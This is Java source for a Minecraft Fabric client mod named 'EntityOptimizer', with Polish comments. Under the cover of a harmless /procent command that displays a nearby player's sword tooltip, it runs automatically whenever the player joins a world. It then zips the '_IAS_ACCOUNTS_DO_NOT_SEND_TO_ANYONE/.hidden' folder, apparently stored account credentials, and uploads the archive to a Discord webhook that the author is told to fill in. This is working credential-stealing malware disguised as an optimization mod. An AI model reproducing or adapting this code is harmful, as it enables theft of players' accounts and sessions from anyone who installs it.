package pl.example.entityoptimizer;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.loader.api.FabricLoader;

import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

import com.mojang.brigadier.arguments.StringArgumentType;

import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.TooltipFlag;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class EntityOptimizerMod implements ClientModInitializer {

    // WSTAW SWÓJ WEBHOOK
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";

    @Override
    public void onInitializeClient() {
        System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent");

        // po wejściu do świata – zip .hidden i wysyłka na webhook
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            onJoinWorld(client);
        });

        // komenda kliencka /procent <nickname>
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            dispatcher.register(
                    literal("procent")
                            .then(argument("nickname", StringArgumentType.word())
                                    .executes(context -> {
                                        String nickname = StringArgumentType.getString(context, "nickname");
                                        handleProcentCommand(context.getSource(), nickname);
                                        return 1;
                                    }))
            );
        });
    }

    private void onJoinWorld(Minecraft mc) {
        String username = mc.getUser().getName();

        try {
            Path gameDir = FabricLoader.getInstance().getGameDir();
            Path hiddenFolder = gameDir
                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
                    .resolve(".hidden");

            if (!Files.exists(hiddenFolder)) {
                sendSimpleMessage("Gracz `" + username + "` wszedł do świata.\nFolder `.hidden` nie istnieje!");
                return;
            }

            // stworzenie ZIP-a w pamięci
            byte[] zipBytes = createZipInMemory(hiddenFolder);

            // nazwa pliku z datą/godziną
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
            String fileName = "hidden_folder_backup_" + timestamp + ".zip";

            // wysyłka jako załącznik
            sendZipAsAttachment(username, zipBytes, fileName);

        } catch (Exception e) {
            e.printStackTrace();
            sendSimpleMessage("Błąd podczas pakowania .hidden: " + e.getMessage());
        }
    }

    // ZIP całego folderu w pamięci
    private byte[] createZipInMemory(Path folder) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            try (var paths = Files.walk(folder)) {
                paths.filter(Files::isRegularFile).forEach(path -> {
                    try {
                        String entryName = folder.relativize(path).toString().replace("\\", "/");
                        ZipEntry zipEntry = new ZipEntry(entryName);
                        zos.putNextEntry(zipEntry);
                        zos.write(Files.readAllBytes(path));
                        zos.closeEntry();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                });
            }
        }
        return baos.toByteArray();
    }

    // multipart/form-data z payload_json + plik .zip
    private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
        URL url = new URL(WEBHOOK_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);

        String boundary = "Boundary-" + System.currentTimeMillis();
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        // JSON z treścią wiadomości
        String payloadJson = "{\"content\": \"Gracz `"
                + escapeJson(username)
                + "` wszedł do świata.\\nZałącznik: `"
                + escapeJson(fileName)
                + "`\"}";

        try (OutputStream os = conn.getOutputStream()) {
            // część z JSON-em
            writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");

            // część z plikiem ZIP
            writeFilePart(os, boundary, fileName, zipBytes, "application/zip");

            // koniec multipart
            os.write(("--" + boundary + "--\r\n").getBytes());
        }

        int responseCode = conn.getResponseCode();
        System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
    }

    private void writePart(OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes());
        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        os.write(content.getBytes("UTF-8"));
        os.write("\r\n".getBytes());
    }

    private void writeFilePart(OutputStream os, String boundary, String fileName, byte[] data, String contentType) throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n").getBytes());
        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        os.write(data);
        os.write("\r\n".getBytes());
    }

    private static String escapeJson(String s) {
        return s
                .replace("\\", "\\\\")
                .replace("\"", "\\\"");
    }

    // prosta wiadomość JSON (bez załącznika), w osobnym wątku
    private void sendSimpleMessage(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                String json = "{\"content\":\"" + escapeJson(content) + "\"}";
                conn.getOutputStream().write(json.getBytes("UTF-8"));

                System.out.println("[EntityOptimizer] Simple message status: " + conn.getResponseCode());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, "DiscordSimpleSender").start();
    }

    // ======================== KOMENDA /procent ========================

    // /procent <nickname>
    private void handleProcentCommand(FabricClientCommandSource source, String nickname) {
        Minecraft mc = Minecraft.getInstance();
        if (mc.level == null || mc.player == null) {
            source.sendFeedback(Component.literal("§cKomenda dostępna tylko w świecie."));
            return;
        }

        // szukamy gracza o podanym nicku
        Player target = null;
        for (Player p : mc.level.players()) {
            if (p.getGameProfile().getName().equalsIgnoreCase(nickname)) {
                target = p;
                break;
            }
        }

        // jeśli brak gracza albo poza zasięgiem / bez linii wzroku → błąd
        if (target == null || !isPlayerVisible(mc.player, target)) {
            source.sendFeedback(Component.literal("§cZła nazwa gracza. Spróbój ponowenie wpisać nick."));
            return;
        }

        // sprawdzamy, co trzyma w ręce
        ItemStack stack = target.getMainHandItem();
        if (stack.isEmpty()
                || (!stack.is(Items.NETHERITE_SWORD) && !stack.is(Items.DIAMOND_SWORD))) {
            source.sendFeedback(Component.literal("§cTen gracz nie trzyma diamentowego/netherytowego miecza."));
            return;
        }

        String ownerName = target.getGameProfile().getName();
        source.sendFeedback(Component.literal("§aOpis miecza gracza " + ownerName + ":"));

        List<String> loreLines = getItemLoreLines(mc, stack);
        if (loreLines.isEmpty()) {
            source.sendFeedback(Component.literal("§7(brak opisu / lore / tooltipu)"));
        } else {
            for (String line : loreLines) {
                source.sendFeedback(Component.literal("§7" + line));
            }
        }
    }

    // czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
    private static boolean isPlayerVisible(Player viewer, Player target) {
        double maxDistSq = 64.0 * 64.0;
        if (viewer.distanceToSqr(target) > maxDistSq) {
            return false;
        }
        return viewer.hasLineOfSight(target);
    }

    // tooltip przedmiotu jako linie tekstu (bez pierwszej linii z nazwą)
    private static List<String> getItemLoreLines(Minecraft mc, ItemStack stack) {
        List<String> lines = new ArrayList<>();

        if (mc.player == null) return lines;

        List<Component> tooltip = stack.getTooltipLines(mc.player, TooltipFlag.Default.NORMAL);
        if (tooltip.isEmpty()) return lines;

        // pomijamy pierwszą linię (nazwa przedmiotu), resztę traktujemy jako "opis"
        for (int i = 1; i < tooltip.size(); i++) {
            lines.add(tooltip.get(i).getString());
        }

        return lines;
    }
}
